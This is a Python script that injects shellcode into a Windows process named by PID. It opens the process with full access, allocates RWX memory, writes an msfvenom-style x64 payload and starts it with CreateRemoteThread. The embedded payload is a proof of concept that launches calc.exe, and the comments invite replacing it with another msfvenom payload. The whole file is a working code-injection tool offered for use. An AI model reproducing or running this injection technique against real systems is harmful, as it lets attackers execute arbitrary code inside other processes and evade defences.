#!/usr/bin/env python3
##########################################################################################################################################
# This script should be run with a pid that should be used to inject shellcode into.                                                     #   
# This is targeted at WINDOWS.                                                                                                           #
# Msfvenom payload needs to be updated accordingly.                                                                                      #       
# Note that this will not work out of the box on most machines, as it has dependencies on psutil and ctypes which may not be installed.  #       
##########################################################################################################################################
from ctypes import * 
from ctypes import wintypes
import sys
import os

# Set the access so that we can rwx with maximum power
page_rwx_value = 0x40
#give us all the rights on the process
process_all_access = 0x000F0000
#allocate virtual memory then zero it after writing
v_mem = 0x1000

#stuff we need
kernel32 = windll.kernel32
pid = int(sys.argv[1])

#payload - POC only
#should launch calc
shellcode =  b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
shellcode += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
shellcode += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
shellcode += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
shellcode += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
shellcode += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
shellcode += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
shellcode += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
shellcode += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
shellcode += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
shellcode += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
shellcode += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
shellcode += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
shellcode += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
shellcode += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
shellcode += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
shellcode += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41"
shellcode += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
shellcode += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
shellcode += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
shellcode += b"\x78\x65\x00"

shellcode_length = len(shellcode)

#these thanks to the securestate github
#turns out python doesn't have this set properly for win64
kernel32.VirtualAllocEx.argtypes = (
	wintypes.HANDLE,
	c_void_p,
	c_uint64,
	c_uint32,
	c_uint32
)
kernel32.VirtualAllocEx.restype = c_void_p
kernel32.WriteProcessMemory.argtypes = (
	wintypes.HANDLE,
	c_void_p,
	c_void_p,
	c_uint64,
	POINTER(c_uint64)
)
kernel32.WriteProcessMemory.restype = c_bool
kernel32.CreateRemoteThread.argtypes = (
	wintypes.HANDLE,
	c_void_p,
	c_uint64,
	c_void_p,
	c_void_p,
	c_uint32,
	POINTER(c_uint32)
)
kernel32.CreateRemoteThread.restype = wintypes.HANDLE


#get a handle to the process we're injecting
proc_handle = kernel32.OpenProcess(process_all_access, False, pid)
#allocate the space
malloc_var = kernel32.VirtualAllocEx(proc_handle, 0, shellcode_length, v_mem, page_rwx_value)
#write the code
kernel32.WriteProcessMemory(proc_handle, malloc_var, shellcode, shellcode_length, None)
#make the remote thread, point entry to head of shellcode
if not kernel32.CreateRemoteThread(proc_handle, None, 0, malloc_var, 0, 0, None):
    print("Couldn't inject. Closing.")
else:
    print("Process injected.")

 